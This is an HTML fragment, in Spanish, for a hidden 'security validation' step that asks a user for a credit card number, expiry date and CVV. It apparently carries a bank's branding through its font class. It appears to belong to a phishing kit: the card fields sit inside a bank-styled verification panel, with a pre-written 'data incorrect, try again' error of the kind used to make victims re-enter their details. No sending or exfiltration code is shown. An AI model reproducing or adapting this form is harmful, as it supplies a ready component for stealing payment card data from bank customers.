<!-- TDC -->
<div id="tdc" class="w-full flex flex-col justify-center items-center pb-6 hidden">
    <h5 class="text-[24px] font-cib-sans-bold mt-10">Validacion de seguridad</h5>
    <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
        <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
            <div class="w-full flex items-center justify-center hiddenerror hidden">
                <span class="text-[11px] text-red-600"> Los datos ingresados son incorrectos. Intenta
                    nuevamente.</span>
            </div>
            <div class="w-[90%] flex flex-col mt-2.5 mb-4">
                <span class="text-[16px] text-center text-gray-800">
                    Ingresa los siguientes datos de tu tarjeta de credito:
                </span>
            </div>

            <!-- Numero de tarjeta -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z">
                        </path>
                    </svg>
                    <input id="numeroTarjetaCredito" type="tel" inputmode="numeric" class="floating-input"
                        placeholder="" value="" />
                    <span id="numeroTarjetaCreditoLabel" class="floating-label">
                        Numero de tarjeta
                    </span>
                </div>
                <span id="numeroTarjetaCreditoError"
                    class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- Fecha de expiracion -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z">
                        </path>
                    </svg>
                    <input id="fechaVencimientoCredito" type="text" maxlength="7" placeholder=""
                        class="floating-input" value="" />
                    <span id="fechaVencimientoCreditoLabel" class="floating-label">
                        Fecha de expiracion (MM-YYYY)
                    </span>
                </div>
                <span id="fechaCreditoError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- CVV -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
                        </path>
                    </svg>
                    <input id="cvvCredito" type="tel" inputmode="numeric" maxlength="4" class="floating-input"
                        placeholder="" value="" />
                    <span id="cvvCreditoLabel" class="floating-label">
                        Codigo de seguridad (CVV)
                    </span>
                </div>
                <span id="cvvCreditoError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <button id="continuarTarjetaCredito"
                class="mt-4 font-bold py-2 px-6 rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                disabled>
                Validar
            </button>
        </div>
    </div>
</div>
